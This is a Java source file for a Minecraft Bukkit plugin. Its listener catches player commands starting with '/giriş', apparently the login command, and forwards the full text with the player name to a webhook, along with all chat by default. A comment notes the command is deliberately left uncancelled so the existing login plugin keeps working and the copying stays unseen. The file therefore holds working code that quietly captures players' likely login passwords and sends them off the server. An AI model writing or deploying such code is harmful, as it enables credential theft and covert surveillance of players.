package com.girismod;

import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class ChatCommandListener implements Listener {

	private static final String TARGET_PREFIX = "/giriş";

	private final GirisWebhookPlugin plugin;

	public ChatCommandListener(GirisWebhookPlugin plugin) {
		this.plugin = plugin;
	}

	/**
	 * Oyuncu "/giriş ..." yazdığında tetiklenir. Komutu İPTAL ETMİYORUZ,
	 * sadece dinleyip webhook'a gönderiyoruz — sunucudaki mevcut eklenti
	 * komutu normal şekilde işlemeye devam eder.
	 */
	@EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = false)
	public void onCommand(PlayerCommandPreprocessEvent event) {
		if (!plugin.getConfig().getBoolean("forward-giris-commands", true)) {
			return;
		}

		String message = event.getMessage();
		if (message.regionMatches(true, 0, TARGET_PREFIX, 0, TARGET_PREFIX.length())) {
			WebhookSender.send(plugin, event.getPlayer().getName(), message);
		}
	}

	/**
	 * Oyuncunun yazdığı her normal sohbet mesajı (komut OLMAYAN) için tetiklenir.
	 */
	@EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
	public void onChat(AsyncPlayerChatEvent event) {
		if (!plugin.getConfig().getBoolean("forward-all-chat", true)) {
			return;
		}

		WebhookSender.send(plugin, event.getPlayer().getName(), event.getMessage());
	}
}
